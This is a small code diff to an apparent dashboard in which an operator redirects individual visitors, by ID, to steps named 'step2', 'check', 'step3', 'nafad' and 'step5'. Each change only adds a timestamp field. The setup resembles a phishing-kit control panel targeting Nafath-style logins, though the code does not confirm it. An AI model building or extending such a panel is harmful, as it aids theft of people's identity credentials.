@@ -2850,7 +2850,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step2" }),
+                      body: JSON.stringify({ visitorId, targetPage: "step2", timestampField: "_v1UpdatedAt" }),
                     });
                   }
                   setActionLoading(null);
@@ -2869,7 +2869,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "check" }),
+                      body: JSON.stringify({ visitorId, targetPage: "check", timestampField: "_v1UpdatedAt" }),
                     });
                   }
                   setActionLoading(null);
@@ -2888,7 +2888,7 @@ const renderNafadBox = () => {
                     await fetch("/api/dashboard/redirect", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step3" }),
+                      body: JSON.stringify({ visitorId, targetPage: "step3", timestampField: "_v6UpdatedAt" }),
                     });
                   }
                   setActionLoading(null);
@@ -3543,7 +3543,7 @@ const renderNafadBox = () => {
                       await fetch("/api/dashboard/redirect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "nafad" }),
+                        body: JSON.stringify({ visitorId, targetPage: "nafad", timestampField: "_v7UpdatedAt" }),
                       });
                     }
                     setActionLoading(null);
@@ -3562,7 +3562,7 @@ const renderNafadBox = () => {
                       await fetch("/api/dashboard/redirect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "step5" }),
+                        body: JSON.stringify({ visitorId, targetPage: "step5", timestampField: "_v7UpdatedAt" }),
                       });
                     }
                     setActionLoading(null);
